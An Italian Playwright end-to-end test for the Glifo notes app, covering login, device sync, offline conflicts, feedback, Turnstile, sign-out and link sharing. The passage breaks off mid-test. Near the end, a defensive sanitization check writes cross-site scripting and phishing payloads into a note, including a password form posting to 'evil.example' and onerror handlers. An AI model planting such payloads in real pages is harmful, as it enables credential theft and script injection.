/**
 * Prova l'account in un browser vero: accesso con il codice, appunti portati nell'account,
 * due dispositivi che si sincronizzano, un conflitto senza rete, le impostazioni, l'uscita,
 * una nota condivisa con un link, i dati scaricati e l'account eliminato.
 *   npm run build && npm run test:e2e
 * Supabase è finto (scripts/fake-supabase.mjs), ma la sincronizzazione usa le vere migrazioni.
 */
import { readFile } from 'node:fs/promises'
import { chromium } from 'playwright-core'
import { preview } from 'vite'
import { CODE, GOOGLE_CODE, createFakeSupabase } from './fake-supabase.mjs'

const server = await preview({ preview: { port: 4175, strictPort: true }, logLevel: 'error' })
const url = server.resolvedUrls.local[0]
const browser = await chromium.launch({ executablePath: process.env.CHROMIUM_PATH || undefined })
// Il tutorial della prima apertura lo prova smoke-test.mjs: qui è già visto.
const newContext = browser.newContext.bind(browser)
browser.newContext = async (options) => {
  const context = await newContext(options)
  // Anche nelle pagine di altri siti (la finta pagina di Google), dove il browser può negarlo.
  await context.addInitScript(() => {
    try {
      localStorage.setItem('glifo.tutorial.v1', 'visto')
    } catch {}
  })
  return context
}
const fake = await createFakeSupabase()
const EMAIL = 'studente@example.com'
let failures = 0
const check = (ok, msg) => {
  console.log(`${ok ? '✓' : '✗'} ${msg}`)
  if (!ok) failures++
}

/** Un dispositivo: un browser con il suo spazio, collegato al Supabase finto. */
async function device() {
  const context = await browser.newContext({ viewport: { width: 1440, height: 900 } })
  await fake.attach(context)
  const page = await context.newPage()
  const errors = []
  page.on('pageerror', (e) => errors.push(e.message))
  await page.goto(url)
  await page.waitForSelector('.cm-editor')
  return { context, page, errors }
}

const titles = (page) => page.locator('.note-title').allInnerTexts()
const editorText = (page) => page.evaluate(() => document.querySelector('.cm-content').innerText)
const accountState = (page) => page.evaluate(() => document.querySelector('.account-button').className)

async function waitFor(page, fn, arg, timeout = 10000) {
  try {
    await page.waitForFunction(fn, arg, { timeout, polling: 200 })
    return true
  } catch {
    return false
  }
}

async function poll(fn, timeout = 10000) {
  const end = Date.now() + timeout
  while (Date.now() < end) {
    if (await fn()) return true
    await new Promise((r) => setTimeout(r, 200))
  }
  return false
}

/** Come quando si torna su Glifo da un'altra app: si scaricano le novità. */
const comeBack = (page) => page.evaluate(() => document.dispatchEvent(new Event('visibilitychange')))

async function typeAtEnd(page, text) {
  await page.locator('.cm-content').click()
  await page.keyboard.press('Control+End')
  await page.keyboard.type(text)
  await page.waitForTimeout(700)
}

/** Accesso con il codice; `answer`: cosa rispondere alla domanda sugli appunti del browser. */
async function login(page, answer = null) {
  await page.locator('.account-button').click()
  const dialog = page.locator('dialog.dialog-login')
  await dialog.locator('input[type=email]').fill(EMAIL)
  await dialog.locator('button[type=submit]').click()
  await dialog.locator('.login-code').fill(CODE)
  const reloaded = page.waitForEvent('load')
  await dialog.locator('button[type=submit]').click()
  if (answer) {
    const question = page.locator('dialog.dialog-confirm')
    await question.waitFor()
    await question.locator(answer === 'aggiungi' ? '.btn-primary' : '.btn:not(.btn-primary)').click()
  }
  await reloaded
  await page.waitForSelector('.cm-editor')
}

try {
  // ——— Il pc, prima senza account ———
  const pc = await device()
  check((await accountState(pc.page)).includes('is-guest'), 'senza account il pulsante dice «Accedi»')
  await pc.page.locator('.notes-head button[aria-label="Nuova nota"]').click()
  await pc.page.keyboard.type('Appunti di prova')
  await typeAtEnd(pc.page, 'scritti prima di accedere')

  // La pagina «Commenti» (8 ottobre 2026), anche senza account: il fumetto in fondo alla barra laterale
  // apre i commenti che chi scrive ha fatto vedere a tutti, divisi in problemi, idee e altro, letti con le
  // regole vere del database (solo i visibili, mai l'email). Lì «Scrivi un commento» manda il messaggio
  // nella tabella feedback con il nome, il sito, la versione di Glifo e il browser; senza rete non parte e
  // il testo resta. Chi fa Glifo risponde e nasconde dalla dashboard.
  const hourAgo = (hours) => new Date(Date.now() - hours * 3_600_000).toISOString()
  await fake.addFeedback({ kind: 'problema', message: 'La lavagna si chiudeva da sola', author: 'Anna', email: 'anna@example.com', visible: true, site: 'online', reply: 'Sistemato, grazie!', created_at: hourAgo(26) })
  await fake.addFeedback({ kind: 'idea', message: 'Le formule anche nei titoli', visible: true, site: 'prova', created_at: hourAgo(3) })
  await fake.addFeedback({ kind: 'problema', message: 'Questo lo legge solo chi fa Glifo', email: 'bruno@example.com', visible: false, site: 'online', created_at: hourAgo(2) })
  const commentReads = []
  pc.page.on('request', (r) => {
    if (r.method() === 'GET' && r.url().includes('/rest/v1/feedback')) commentReads.push(new URL(r.url()).searchParams.get('select'))
  })
  const noNetwork = (route) => route.abort('internetdisconnected')
  // Senza rete la richiesta non arriva (il Supabase finto, collegato con route, risponderebbe anche offline).
  await pc.page.route('**/rest/v1/feedback*', noNetwork)
  await pc.page.locator('.side-profile button[aria-label="Commenti"]').click()
  // Solo la finestra aperta: chiusa, se ne va al giro dopo.
  const comments = pc.page.locator('dialog.dialog-comments[open]')
  await comments.locator('.comments-body button', { hasText: 'Riprova' }).waitFor()
  const commentsOffline = await comments.locator('.comments-state').innerText()
  await pc.page.unroute('**/rest/v1/feedback*', noNetwork)
  await comments.locator('.comments-body button', { hasText: 'Riprova' }).click()
  await comments.locator('.comments-tabs label', { hasText: 'Problemi' }).click()
  await comments.locator('.comment').first().waitFor()
  const tabsShown = await comments.locator('.comments-tabs label').allInnerTexts()
  const problemsShown = await comments.locator('.comment').allInnerTexts()
  const replyShown = await comments.locator('.comment-reply').allInnerTexts()
  await comments.locator('.comments-tabs label', { hasText: 'Idee' }).click()
  const ideasShown = await comments.locator('.comment-author').allInnerTexts()
  // Quello che chiede la pagina; poi l'email di chi scrive non si legge nemmeno chiedendola apposta.
  const appReads = [...commentReads]
  const emailRead = await pc.page.evaluate(async (base) => (await fetch(`${base}/rest/v1/feedback?select=email`)).status, 'https://fgsuonetdmcgojbvrsxi.supabase.co')
  check(
    commentsOffline === 'Non riesco a caricare i commenti: controlla la connessione e riprova.' &&
      tabsShown.join('|') === 'Problemi1|Idee1|Altro0' &&
      problemsShown.length === 1 &&
      problemsShown[0].includes('Anna') &&
      problemsShown[0].includes('La lavagna si chiudeva da sola') &&
      !problemsShown.join().includes('solo chi fa Glifo') &&
      replyShown[0]?.includes('Sistemato, grazie!') &&
      ideasShown.join() === 'Anonimo' &&
      emailRead === 401 &&
      appReads.length > 0 &&
      appReads.every((select) => select === 'id,created_at,kind,author,message,reply'),
    `«Commenti»: senza rete lo dice e «Riprova» li carica; si vedono solo quelli visibili, divisi per tipo, con il nome (o «Anonimo») e la risposta; l'email non si legge (${JSON.stringify({ commentsOffline, tabsShown, problemsShown, replyShown, ideasShown, emailRead, appReads })})`,
  )

  await comments.locator('.comments-tabs label', { hasText: 'Problemi' }).click()
  await comments.locator('.comments-write').click()
  const feedback = pc.page.locator('dialog.dialog-feedback')
  const kindFromTab = await feedback.locator('input[value="problema"]').isChecked()
  await feedback.locator('textarea.feedback-message').fill('L\'editor delle tabelle non si apriva')
  await feedback.locator('input[autocomplete="nickname"]').fill('Studente')
  await feedback.locator('input[type=email]').fill(EMAIL)
  await pc.page.route('**/rest/v1/feedback*', noNetwork)
  await feedback.locator('button[type=submit]').click()
  await feedback.locator('.prompt-error:not([hidden])').waitFor()
  const offlineError = await feedback.locator('.prompt-error').innerText()
  const keptText = await feedback.locator('textarea.feedback-message').inputValue()
  await pc.page.unroute('**/rest/v1/feedback*', noNetwork)
  await feedback.locator('button[type=submit]').click()
  await feedback.waitFor({ state: 'detached' })
  const feedbackSent = await poll(async () => (await fake.feedback()).length === 4)
  const feedbackRow = (await fake.feedback()).find((row) => row.author === 'Studente')
  const thanks = await pc.page.locator('.toast').last().innerText()
  // Mandato a tutti: la pagina si aggiorna e il commento è il primo dei problemi.
  const listed = await waitFor(pc.page, () => document.querySelectorAll('dialog.dialog-comments[open] .comment').length === 2)
  const firstProblem = await comments.locator('.comment').first().innerText()
  check(
    kindFromTab &&
      offlineError.startsWith('Senza connessione il messaggio non parte') &&
      keptText === 'L\'editor delle tabelle non si apriva' &&
      feedbackSent &&
      feedbackRow?.kind === 'problema' &&
      feedbackRow.message === 'L\'editor delle tabelle non si apriva' &&
      feedbackRow.email === EMAIL &&
      feedbackRow.visible === true &&
      feedbackRow.site === 'online' &&
      /^(locale|[0-9a-f]{7}), \d{4}-\d{2}-\d{2} \d{2}:\d{2}$/.test(feedbackRow.version) &&
      feedbackRow.browser.endsWith('· finestra 1440×900') &&
      thanks === 'Grazie! Il messaggio è arrivato.' &&
      listed &&
      firstProblem.startsWith('Studente') &&
      firstProblem.includes('oggi alle'),
    `«Scrivi un commento»: parte dalla scheda aperta; senza rete non parte e il testo resta; poi arriva nella tabella con il tipo, il nome, l'email, il sito, la versione e il browser, e si vede subito nella pagina (${JSON.stringify({ kindFromTab, offlineError, feedbackRow, thanks, listed, firstProblem })})`,
  )

  // Un commento solo per chi fa Glifo: arriva, ma la pagina non lo mostra.
  await comments.locator('.comments-write').click()
  const nameKept = await feedback.locator('input[autocomplete="nickname"]').inputValue()
  await feedback.locator('textarea.feedback-message').fill('Vorrei usarlo a scuola, scrivetemi')
  await feedback.locator('.feedback-visible input').uncheck()
  await feedback.locator('button[type=submit]').click()
  await feedback.waitFor({ state: 'detached' })
  const privateSent = await poll(async () => (await fake.feedback()).length === 5)
  const privateRow = (await fake.feedback()).find((row) => row.message.startsWith('Vorrei usarlo a scuola'))
  // Chi fa Glifo nasconde un commento dalla dashboard: riaprendo la pagina non c'è più.
  await fake.updateFeedback('La lavagna si chiudeva da sola', { visible: false })
  await comments.locator('.dialog-actions button', { hasText: 'Chiudi' }).click()
  await pc.page.locator('.side-profile button[aria-label="Commenti"]').click()
  await waitFor(pc.page, () => {
    const count = document.querySelector('dialog.dialog-comments[open] .comments-count')
    return !!count && count.textContent !== ''
  })
  const problemsAfter = await comments.locator('.comment').allInnerTexts()
  await comments.locator('.dialog-actions button', { hasText: 'Chiudi' }).click()
  check(
    nameKept === 'Studente' &&
      privateSent &&
      privateRow?.visible === false &&
      privateRow.author === 'Studente' &&
      problemsAfter.length === 1 &&
      problemsAfter[0].includes('L\'editor delle tabelle non si apriva'),
    `un commento solo per chi fa Glifo arriva ma non si vede; uno nascosto dalla dashboard sparisce dalla pagina (${JSON.stringify({ nameKept, privateRow, problemsAfter })})`,
  )

  // Il controllo anti-robot (Turnstile, 9 ottobre 2026): prima dell'email Glifo chiede un token a
  // Cloudflare (qui il Turnstile finto) e lo manda a Supabase, che senza token non manda l'email. Se
  // Cloudflare non lo dà, o Supabase lo rifiuta, la finestra lo dice e propone Google.
  await pc.page.locator('.account-button').click()
  const guarded = pc.page.locator('dialog.dialog-login')
  const refused = async (mode) => {
    await pc.page.evaluate((m) => (window.__turnstileMode = m), mode)
    await guarded.locator('input[type=email]').fill(EMAIL)
    await guarded.locator('.prompt-error[hidden]').waitFor({ state: 'attached' })
    await guarded.locator('button[type=submit]').click()
    await guarded.locator('.prompt-error:not([hidden])').waitFor()
    const submit = guarded.locator('button[type=submit]')
    return { text: await guarded.locator('.prompt-error').innerText(), button: await submit.innerText(), enabled: await submit.isEnabled() }
  }
  const cloudflareSaysNo = await refused('errore')
  const supabaseSaysNo = await refused('sbagliato')
  await waitFor(pc.page, () => window.__turnstileRemoved?.length === 2)
  const widget = await pc.page.evaluate(() => {
    const { sitekey, appearance, language, theme, host } = window.__turnstile
    return { sitekey, appearance, language, theme, host, removed: window.__turnstileRemoved }
  })
  await pc.page.evaluate(() => delete window.__turnstileMode)
  await guarded.locator('button', { hasText: 'Annulla' }).click()
  check(
    [cloudflareSaysNo, supabaseSaysNo].every(
      (r) => r.text.includes('controllo anti-robot') && r.text.includes('Continua con Google') && r.enabled && r.button === 'Mandami l\'email',
    ),
    `senza il token di Turnstile, o con uno che Supabase rifiuta, l'email non parte e la finestra propone Google (${JSON.stringify({ cloudflareSaysNo, supabaseSaysNo })})`,
  )
  check(
    widget.sitekey === '0x4AAAAAAFSl9e5iFMxjVBro' &&
      widget.appearance === 'interaction-only' &&
      widget.language === 'it' &&
      widget.theme === 'light' &&
      widget.host === 'login-captcha' &&
      widget.removed?.length === 2,
    `Turnstile con la chiave del sito, solo se chiede di cliccare, in italiano, nel posto della finestra e tolto dopo ogni token (${JSON.stringify(widget)})`,
  )

  // Codice sbagliato: si resta nella finestra, con un messaggio.
  await pc.page.locator('.account-button').click()
  const dialog = pc.page.locator('dialog.dialog-login')
  check((await dialog.locator('a[href="privacy.html"]').count()) === 1, 'la finestra di accesso porta all\'informativa sulla privacy')
  await dialog.locator('input[type=email]').fill(EMAIL)
  await dialog.locator('button[type=submit]').click()
  await dialog.locator('.login-code').fill('000000')
  await dialog.locator('button[type=submit]').click()
  await dialog.locator('.prompt-error:not([hidden])').waitFor()
  check((await dialog.locator('.prompt-error').innerText()).includes('sbagliato'), 'un codice sbagliato viene segnalato')
  await dialog.locator('button', { hasText: 'Annulla' }).click()

  // Codice giusto, e la nota scritta prima va nell'account.
  await login(pc.page, 'aggiungi')
  check(await waitFor(pc.page, () => document.querySelector('.account-button').classList.contains('is-idle')), 'dopo l\'accesso il pc è sincronizzato')
  check(JSON.stringify(await titles(pc.page)) === '["Appunti di prova"]', `nell'account c'è la nota scritta prima (${await titles(pc.page)})`)
  check(
    await poll(async () => (await fake.notes(EMAIL)).some((n) => n.content.includes('scritti prima di accedere'))),
    'la nota è arrivata nell\'account',
  )

  // ——— Il telefono entra con lo stesso account ———
  const tel = await device()
  await login(tel.page)
  check(
    await waitFor(tel.page, () => [...document.querySelectorAll('.note-title')].map((t) => t.textContent).join() === 'Appunti di prova'),
    'sul telefono arrivano le note dell\'account (e la nota vuota di partenza sparisce)',
  )
  check((await editorText(tel.page)).includes('scritti prima di accedere'), 'e si apre quella nota')

  await typeAtEnd(tel.page, '\n\naggiunto dal telefono')
  check(
    await poll(async () => (await fake.notes(EMAIL)).some((n) => n.content.includes('aggiunto dal telefono'))),
    'la modifica fatta sul telefono arriva nell\'account da sola',
  )
  await comeBack(pc.page)
  check(
    await waitFor(pc.page, () => document.querySelector('.cm-content').innerText.includes('aggiunto dal telefono')),
    'tornando sul pc la nota aperta si aggiorna',
  )

  // ——— Conflitto: il pc scrive senza rete, intanto il telefono cambia la stessa nota ———
  await pc.context.setOffline(true)
  await typeAtEnd(pc.page, ' — scritto sul pc senza rete')
  check(await waitFor(pc.page, () => document.querySelector('.account-button').classList.contains('is-offline')), 'senza rete il pulsante dell\'account lo mostra')
  await typeAtEnd(tel.page, ' — scritto sul telefono')
  check(await poll(async () => (await fake.notes(EMAIL)).some((n) => n.content.includes('scritto sul telefono'))), 'il telefono manda la sua versione')
  await pc.context.setOffline(false)
  check(await waitFor(pc.page, () => document.querySelectorAll('.note-badge').length === 1), 'tornata la rete, sul pc ci sono tutte e due le versioni')
  check((await titles(pc.page)).length === 2, 'due note nell\'elenco')
  const pcText = await editorText(pc.page)
  check(pcText.includes('scritto sul pc senza rete') && !pcText.includes('scritto sul telefono'), 'sul pc si continua a scrivere sulla propria versione')
  check((await pc.page.locator('.note-item.is-active .note-badge').count()) === 1, 'ed è quella con l\'etichetta «copia in conflitto»')
  check((await pc.page.locator('.toast').allInnerTexts()).some((t) => t.includes('tutte e due le versioni')), 'un avviso spiega cosa è successo')
  await comeBack(tel.page)
  check(await waitFor(tel.page, () => document.querySelectorAll('.note-item').length === 2), 'la copia arriva anche sul telefono')

  // ——— Le impostazioni vanno con l'account ———
  // Il tema si cambia nelle impostazioni
  await pc.page.locator('.side-profile button[aria-label="Impostazioni"]').click()
  await pc.page.locator('dialog .segmented label', { hasText: 'Scuro' }).click()
  await pc.page.keyboard.press('Escape')
  const theme = await pc.page.evaluate(() => document.documentElement.dataset.theme)
  check(
    await waitFor(
      tel.page,
      (wanted) => {
        document.dispatchEvent(new Event('visibilitychange'))
        return document.documentElement.dataset.theme === wanted
      },
      theme,
      15000,
    ),
    `il tema scelto sul pc arriva sul telefono (${theme})`,
  )

  // ——— Uscire dall'account ———
  // Una lavagna scritta sta solo in questo browser, non nell'account: uscendo Glifo lo dice, e la
  // toglie insieme alle note.
  await pc.page.locator('.view-button[aria-label="Lavagna"]').click()
  await pc.page.waitForSelector('.board-pane[data-loaded="true"]')
  const drawnNote = await pc.page.locator('.board-pane').getAttribute('data-note')
  const stage = await pc.page.locator('.board-stage').boundingBox()
  await pc.page.mouse.move(stage.x + 60, stage.y + 120)
  await pc.page.mouse.down()
  for (let i = 1; i <= 10; i++) await pc.page.mouse.move(stage.x + 60 + i * 15, stage.y + 120 + i * 4)
  await pc.page.mouse.up()
  await pc.page.locator('.view-button[aria-label="Editor"]').click()
  await pc.page.locator('.account-button').click()
  await pc.page.locator('dialog.dialog-account button', { hasText: 'Esci dall\'account' }).click()
  const boardWarning = pc.page.locator('dialog.dialog-confirm')
  await boardWarning.waitFor()
  const warningText = await boardWarning.locator('.confirm-message').textContent()
  const out = pc.page.waitForEvent('load')
  await boardWarning.locator('.btn-danger', { hasText: 'Esci lo stesso' }).click()
  await out
  await pc.page.waitForSelector('.cm-editor')
  const boardLeft = await pc.page.evaluate(
    (note) =>
      new Promise((resolve) => {
        const open = indexedDB.open('glifo-lavagne')
        open.onsuccess = () => {
          const req = open.result.transaction('strokes', 'readonly').objectStore('strokes').count(IDBKeyRange.bound([note], [note, []]))
          req.onsuccess = () => {
            open.result.close()
            resolve(req.result)
          }
        }
      }),
    drawnNote,
  )
  check(
    warningText.includes('La lavagna di una nota sta solo in questo browser') && boardLeft === 0,
    `uscendo, Glifo avvisa che la lavagna non è nell'account, e la toglie dal browser con le note (${JSON.stringify({ warningText, boardLeft })})`,
  )
  check((await accountState(pc.page)).includes('is-guest'), 'uscendo si torna senza account')
  check(JSON.stringify(await titles(pc.page)) === '["Benvenuto in Glifo"]', `restano solo gli appunti di prima (${await titles(pc.page)})`)
  const left = await pc.page.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith('glifo.u.') || k.startsWith('glifo.auth')))
  check(left.length === 0, `nel browser non resta niente dell'account (${left})`)

  // Rientrando le note tornano.
  await login(pc.page)
  check(await waitFor(pc.page, () => document.querySelectorAll('.note-item').length === 2), 'rientrando, le note dell\'account tornano')

  // ——— Due schede dello stesso account ———
  const tab = await pc.context.newPage()
  tab.on('pageerror', (e) => pc.errors.push(e.message))
  await tab.goto(url)
  await tab.waitForSelector('.cm-editor')
  check(!(await accountState(tab)).includes('is-guest'), 'una seconda scheda è già dentro l\'account')
  await pc.page.waitForTimeout(500)
  await typeAtEnd(pc.page, ' — anche nella seconda scheda')
  check(
    await waitFor(tab, () => document.querySelector('.cm-content').innerText.includes('anche nella seconda scheda')),
    'la seconda scheda vede subito le modifiche',
  )
  // Si esce da una scheda: anche l'altra esce, e non ricrea niente dell'account.
  await pc.page.waitForTimeout(3500)
  await pc.page.locator('.account-button').click()
  const outAgain = tab.waitForEvent('load')
  await pc.page.locator('dialog.dialog-account button', { hasText: 'Esci dall\'account' }).click()
  await outAgain
  await tab.waitForSelector('.cm-editor')
  check((await accountState(tab)).includes('is-guest'), 'uscendo da una scheda esce anche l\'altra')
  await pc.page.waitForSelector('.cm-editor')
  const leftAgain = await tab.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith('glifo.u.') || k.startsWith('glifo.auth')))
  check(leftAgain.length === 0, `e nel browser non resta niente dell'account (${leftAgain})`)

  // ——— Il link nell'email, al posto del codice ———
  const tablet = await device()
  await tablet.page.locator('.account-button').click()
  const linkDialog = tablet.page.locator('dialog.dialog-login')
  await linkDialog.locator('input[type=email]').fill(EMAIL)
  await linkDialog.locator('button[type=submit]').click()
  await linkDialog.locator('.login-code').waitFor()
  await tablet.page.goto(fake.link())
  check(
    await waitFor(tablet.page, () => document.querySelector('.account-button') && !document.querySelector('.account-button').classList.contains('is-guest')),
    'aprendo il link nell\'email si entra nell\'account',
  )
  check(await waitFor(tablet.page, () => document.querySelectorAll('.note-item').length === 2), 'e arrivano le note')
  check(!(await tablet.page.evaluate(() => location.search)).includes('code='), 'il codice del link sparisce dall\'indirizzo')
  pc.errors.push(...tablet.errors)

  // Il link aperto su un altro dispositivo (il codice l'ha chiesto il tablet): non si entra,
  // ma un avviso spiega perché e suggerisce il codice.
  const altro = await device()
  await altro.page.goto(fake.link())
  check(
    await waitFor(altro.page, () => [...document.querySelectorAll('.toast')].some((t) => t.textContent.includes('nel browser in cui hai chiesto di entrare'))),
    'aprendo il link su un altro dispositivo, un avviso spiega come fare',
  )
  check((await accountState(altro.page)).includes('is-guest'), 'e non si entra nell\'account')
  pc.errors.push(...altro.errors)

  // Il link copiato dall'email e incollato nella finestra di Glifo, senza aprirlo.
  const portatile = await device()
  await portatile.page.locator('.account-button').click()
  const pasteDialog = portatile.page.locator('dialog.dialog-login')
  await pasteDialog.locator('input[type=email]').fill(EMAIL)
  await pasteDialog.locator('button[type=submit]').click()
  await pasteDialog.locator('.login-code').fill('https://diodialtro.github.io/Glifo/')
  await pasteDialog.locator('button[type=submit]').click()
  await pasteDialog.locator('.prompt-error:not([hidden])').waitFor()
  check(
    (await pasteDialog.locator('.prompt-error').innerText()).includes('Incolla qui il link'),
    'incollando un altro indirizzo, un messaggio dice cosa serve',
  )
  const pasted = portatile.page.waitForEvent('load')
  await pasteDialog.locator('.login-code').fill(` Sign in <${fake.emailLink()}>\n`)
  await pasteDialog.locator('button[type=submit]').click()
  await pasted
  await portatile.page.waitForSelector('.cm-editor')
  check(!(await accountState(portatile.page)).includes('is-guest'), 'incollando il link dell\'email nella finestra si entra')
  check(await waitFor(portatile.page, () => document.querySelectorAll('.note-item').length === 2), 'e arrivano le note')

  // ——— Accesso con Google ———
  const google = await device()
  // Un appunto solo di questo browser: entrando, Glifo chiede se aggiungerlo all'account.
  await google.page.locator('.notes-head button[aria-label="Nuova nota"]').click()
  await google.page.keyboard.type('Appunto del browser')
  await google.page.waitForTimeout(700)
  await google.page.locator('.account-button').click()
  const googleDialog = google.page.locator('dialog.dialog-login')
  fake.setGoogle({ enabled: false })
  await googleDialog.locator('button', { hasText: 'Continua con Google' }).click()
  await googleDialog.locator('.prompt-error:not([hidden])').waitFor()
  check(
    (await googleDialog.locator('.prompt-error').innerText()).includes('non è ancora attivo'),
    'se in Supabase Google non è attivo, la finestra lo dice (e non si va su una pagina di errore)',
  )
  fake.setGoogle({ enabled: true, email: EMAIL })
  await googleDialog.locator('button', { hasText: 'Continua con Google' }).click()
  const keepHere = async () => {
    const question = google.page.locator('dialog.dialog-confirm')
    await question.waitFor()
    await question.locator('.btn:not(.btn-primary)').click()
  }
  await keepHere()
  check(
    await waitFor(google.page, () => document.querySelector('.account-button') && !document.querySelector('.account-button').classList.contains('is-guest')),
    'con Google si entra nell\'account (la stessa email: lo stesso account)',
  )
  check(await waitFor(google.page, () => document.querySelectorAll('.note-item').length === 2), 'e arrivano le note')
  check(!(await google.page.evaluate(() => location.search)).includes('code='), 'il codice di Google sparisce dall\'indirizzo')

  // Si torna da Google con un altro account mentre in questo browser c'è ancora il primo, con
  // una modifica non ancora mandata: non deve finire nell'altro account, nemmeno mentre Glifo
  // chiede cosa fare dell'appunto del browser (intanto il primo account prova a sincronizzare).
  fake.failPush(true)
  await typeAtEnd(google.page, ' — modifica solo del primo account')
  await google.page.waitForTimeout(3500)
  fake.failPush(false)
  const OTHER = 'altra@example.com'
  fake.setGoogle({ email: OTHER })
  await google.page.evaluate(() => localStorage.setItem('glifo.auth.v1-code-verifier', JSON.stringify('verificatore')))
  await google.page.goto(`${url}?code=${GOOGLE_CODE}`)
  await google.page.locator('dialog.dialog-confirm').waitFor()
  await google.page.waitForTimeout(4000)
  await keepHere()
  const emailHere = () =>
    google.page.evaluate(() => JSON.parse(localStorage.getItem('glifo.account.v1') ?? 'null')?.email).catch(() => null)
  check(await poll(async () => (await emailHere()) === OTHER), 'tornando con un altro account Google si passa a quello')
  await google.page.waitForSelector('.cm-editor')
  await google.page.waitForTimeout(1500)
  const otherNotes = await fake.notes(OTHER)
  check(
    !otherNotes.some((n) => n.content.includes('modifica solo del primo account')),
    `le note del primo account non finiscono nell'altro (${otherNotes.length} note nell'altro)`,
  )
  check(
    !(await fake.notes(EMAIL)).some((n) => n.content.includes('modifica solo del primo account')),
    'e la modifica resta in questo browser, nello spazio del primo account',
  )
  pc.errors.push(...google.errors)

  // ——— Condividere una nota con un link ———
  // Senza account, «Condividi» spiega che serve l'account e propone di accedere.
  await altro.page.locator('button.share-button').click()
  const signedOut = altro.page.locator('dialog.dialog-share')
  await signedOut.waitFor()
  check((await signedOut.innerText()).includes('serve l\'account'), 'senza account, «Condividi» spiega che serve l\'account')
  await signedOut.locator('.btn', { hasText: 'Annulla' }).click()

  const owner = portatile.page
  // Una nota nuova ha il titolo selezionato: si scrive quello vero, poi il resto in fondo.
  await owner.locator('.notes-head button[aria-label="Nuova nota"]').click()
  await owner.keyboard.insertText('Nota da condividere')
  await owner.keyboard.press('Control+End')
  await owner.keyboard.insertText('Il limite $\\lim_{x \\to 0} \\frac{\\sin x}{x} = 1$.\n')
  await owner.waitForTimeout(700)
  await owner.locator('button.share-button').click()
  const share = owner.locator('dialog.dialog-share')
  await share.waitFor()
  const shareReady = () => waitFor(owner, () => {
    const select = document.querySelector('dialog.dialog-share select')
    return select && !select.disabled
  }, undefined, 15000)
  check((await shareReady()) && (await share.locator('select').inputValue()) === 'none', 'una nota nuova non ha ancora un link («Con limitazioni»)')
  await share.locator('select').selectOption('link')
  check(
    await waitFor(owner, () => document.querySelector('dialog.dialog-share .share-url')?.value.includes('nota.html#'), undefined, 15000),
    'scegliendo «Chiunque abbia il link» arriva il link',
  )
  const link = await share.locator('.share-url').inputValue()
  check(link.startsWith(url), `il link porta alla pagina accanto a Glifo (${link})`)
  check((await share.locator('.share-print').count()) === 1, 'anche con l\'account, da «Condividi» si stampa o si salva in PDF')
  await share.locator('.btn-primary', { hasText: 'Fine' }).click()

  // Chi riceve il link lo apre senza account, e se ne salva una copia.
  const reader = await altro.context.newPage()
  reader.on('pageerror', (e) => pc.errors.push(e.message))
  await reader.goto(link)
  check(await waitFor(reader, () => document.querySelector('.shared-body:not([hidden]) .katex')), 'chi apre il link vede la nota, con le formule')
  check((await reader.locator('.shared-title').innerText()) === 'Nota da condividere', 'e il suo titolo')
  await reader.locator('button', { hasText: 'Salva una copia' }).click()
  await reader.waitForSelector('.cm-editor')
  check((await editorText(reader)).includes('Nota da condividere'), 'con «Salva una copia» la nota va tra i suoi appunti e si apre in Glifo')
  check(
    await waitFor(reader, () => [...document.querySelectorAll('.toast')].some((t) => t.textContent.includes('Copia salvata'))),
    'e un avviso dice dov\'è la copia',
  )
  await reader.close()

  // La nota cambia: il link mostra ancora la fotografia, finché non si aggiorna.
  await typeAtEnd(owner, '\nAggiunta dopo la fotografia.')
  await owner.locator('button.share-button').click()
  await shareReady()
  check(
    await waitFor(owner, () => document.querySelector('dialog.dialog-share .share-snapshot')?.textContent.includes('dopo è cambiata')),
    'cambiata la nota, il dialogo dice che il link mostra la fotografia di prima',
  )
  const viewer = await altro.context.newPage()
  viewer.on('pageerror', (e) => pc.errors.push(e.message))
  const sharedText = async () => {
    await viewer.goto('about:blank')
    await viewer.goto(link)
    await viewer.waitForSelector('.shared-body:not([hidden]), .shared-status.is-problem')
    return viewer.locator('main').innerText()
  }
  check(!(await sharedText()).includes('Aggiunta dopo'), 'chi apre il link vede la fotografia di prima')
  await share.locator('button', { hasText: 'Aggiorna il link' }).click()
  check(
    await waitFor(owner, () => document.querySelector('dialog.dialog-share .share-snapshot')?.textContent.includes('com\'è adesso')),
    '«Aggiorna il link» rifà la fotografia',
  )
  check((await sharedText()).includes('Aggiunta dopo la fotografia'), 'e il link mostra la nota di adesso')

  // Senza «Consenti copie» non c'è «Salva una copia».
  await share.locator('.share-copy input').uncheck()
  await shareReady()
  await sharedText()
  check(!(await viewer.locator('button', { hasText: 'Salva una copia' }).isVisible()), 'senza «Consenti copie» la copia non si salva')

  // Togliere il link: non si apre più.
  await share.locator('select').selectOption('none')
  const confirmUnshare = owner.locator('dialog.dialog-confirm')
  await confirmUnshare.waitFor()
  await confirmUnshare.locator('.btn-danger').click()
  check(
    await waitFor(owner, () => document.querySelector('dialog.dialog-share select')?.value === 'none' && document.querySelector('dialog.dialog-share .share-link').hidden),
    'tolto il link, il dialogo torna a «Con limitazioni»',
  )
  check((await sharedText()).includes('non funziona più'), 'e il link non si apre più')
  await share.locator('.btn-primary', { hasText: 'Fine' }).click()

  // Una nota fatta apposta per ingannare chi la apre: niente codice eseguito, niente moduli.
  await owner.locator('.notes-head button[aria-label="Nuova nota"]').click()
  await owner.keyboard.insertText('Nota cattiva')
  await owner.keyboard.press('Control+End')
  await owner.keyboard.insertText(
    [
      '<form action="https://evil.example/ruba"><input name="password" type="password"><button>Accedi di nuovo</button></form>',
      '<style>.shared-top { display: none !important }</style>',
      '<img src="x" onerror="window.__rubato = 1"> <a href="javascript:window.__rubato = 2">link</a>',
      '<div style="position: fixed; inset: 0; background: red">copre tutto</div>',
      '',
      '```grafico',
      'y = x^2 <img src=x onerror="window.__rubato = 3">',
      '```',
      '',
      '```schema',
      '{"v":1,"nodes":[{"id":"a","shape":"rect","x":0,"y":0,"w":160,"h":60,"text":"<img src=x onerror=\\"window.__rubato = 4\\">"}],"edges":[]}',
      '```',
      '',
    ].join('\n'),
  )
  await owner.waitForTimeout(1500)
  check(
    await owner.evaluate(() => {
      const r = document.querySelector('button.share-button').getBoundingClientRect()
      return !!document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2)?.closest('.share-button')
    }),
    'anche nell\'anteprima di Glifo la nota non copre la barra',
  )
  await owner.locator('button.share-button').click()
  await shareReady()
  await share.locator('select').selectOption('link')
